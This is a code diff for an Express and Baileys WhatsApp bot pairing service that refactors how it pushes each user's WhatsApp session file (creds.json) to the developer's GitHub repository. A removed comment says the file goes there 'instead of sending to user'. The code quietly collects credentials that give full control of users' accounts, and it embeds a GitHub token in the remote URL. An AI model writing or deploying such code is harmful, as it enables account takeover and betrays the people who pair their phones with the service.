@@ -1,7 +1,7 @@
 import express from 'express';
 import fs from 'fs';
 import pino from 'pino';
-import { execSync } from 'child_process';
+import simpleGit from 'simple-git'; // استيراد simple-git
 import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
 import pn from 'awesome-phonenumber';
 
@@ -12,7 +12,6 @@ const GITHUB_USERNAME = 'K0reem0';
 const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
 const GITHUB_REPO = 'TheMystic-Bot-MD';
 const SESSION_FOLDER = 'MysticSession';
-const REPO_DIR = '/tmp/repo'; // Temporary directory for cloning the repo
 
 function removeFile(FilePath) {
     try {
@@ -30,48 +29,39 @@ async function pushToGitHub(sessionData, phoneNumber) {
             throw new Error('GitHub token is missing');
         }
 
-        // Create temporary directory if it doesn't exist
-        if (!fs.existsSync(REPO_DIR)) {
-            fs.mkdirSync(REPO_DIR, { recursive: true });
-        }
-
-        // Clone the repository
-        const remoteUrl = `https://${GITHUB_USERNAME}:${GITHUB_TOKEN}@github.com/${GITHUB_USERNAME}/${GITHUB_REPO}.git`;
-        execSync(`git clone ${remoteUrl} ${REPO_DIR}`, { cwd: REPO_DIR });
-
-        // Configure git
-        execSync('git config user.name "K0reem0"', { cwd: REPO_DIR });
-        execSync('git config user.email "202470349@su.edu.ye"', { cwd: REPO_DIR });
+        const git = simpleGit();
 
         // Create session directory if it doesn't exist
-        const sessionDir = `${REPO_DIR}/${SESSION_FOLDER}`;
-        if (!fs.existsSync(sessionDir)) {
-            fs.mkdirSync(sessionDir);
+        if (!fs.existsSync(SESSION_FOLDER)) {
+            fs.mkdirSync(SESSION_FOLDER);
         }
 
         // Save session file
-        const fileName = `${sessionDir}/${phoneNumber}_creds.json`;
+        const fileName = `${SESSION_FOLDER}/${phoneNumber}_creds.json`;
         fs.writeFileSync(fileName, sessionData);
 
-        // Git commands
-        execSync('git add .', { cwd: REPO_DIR });
-        execSync(`git commit -m "Added session for ${phoneNumber}"`, { cwd: REPO_DIR });
-        execSync(`git push origin main`, { cwd: REPO_DIR });
+        // Configure remote origin if it doesn't exist
+        const remoteUrl = `https://${GITHUB_USERNAME}:${GITHUB_TOKEN}@github.com/${GITHUB_USERNAME}/${GITHUB_REPO}.git`;
+        const remotes = await git.getRemotes(true);
+        if (!remotes.some(r => r.name === 'origin')) {
+            await git.addRemote('origin', remoteUrl);
+        }
 
-        // Clean up
-        removeFile(REPO_DIR);
+        // Git commands using simple-git
+        await git.add('.');
+        await git.commit(`Added session for ${phoneNumber}`);
+        await git.push('origin', 'HEAD');
 
         return true;
     } catch (error) {
         console.error('GitHub push error:', error);
-        removeFile(REPO_DIR);
         return false;
     }
 }
 
 router.get('/', async (req, res) => {
     let num = req.query.number;
-    let dirs = './' + (num || session);
+    let dirs = './' + (num || 'session');
 
     // Clean old session
     await removeFile(dirs);
@@ -81,8 +71,8 @@ router.get('/', async (req, res) => {
     const phone = pn('+' + num);
     if (!phone.isValid()) {
         if (!res.headersSent) {
-            return res.status(400).send({ 
-                code: 'Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.' 
+            return res.status(400).send({
+                code: 'Invalid phone number. Please enter your full international number (e.g., 15551234567 for US, 447911123456 for UK, 84987654321 for Vietnam, etc.) without + or spaces.'
             });
         }
         return;
@@ -90,7 +80,6 @@ router.get('/', async (req, res) => {
 
     // Format as E.164 without +
     num = phone.getNumber('e164').replace('+', '');
-    const userJid = jidNormalizedUser(num + '@s.whatsapp.net'); // Define userJid here
 
     async function initiateSession() {
         const { state, saveCreds } = await useMultiFileAuthState(dirs);
@@ -129,12 +118,13 @@ router.get('/', async (req, res) => {
                     console.log("✅ Connected successfully!");
                     await delay(5000);
 
+                    // Define userJid here to ensure it's always available
+                    const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
+
                     try {
                         const sessionKnight = fs.readFileSync(dirs + '/creds.json');
-                        
-                        // Push to GitHub instead of sending to user
                         const pushSuccess = await pushToGitHub(sessionKnight, num);
-                        
+
                         if (pushSuccess) {
                             await KnightBot.sendMessage(userJid, {
                                 image: { url: 'https://files.catbox.moe/yjj0x6.jpg' },
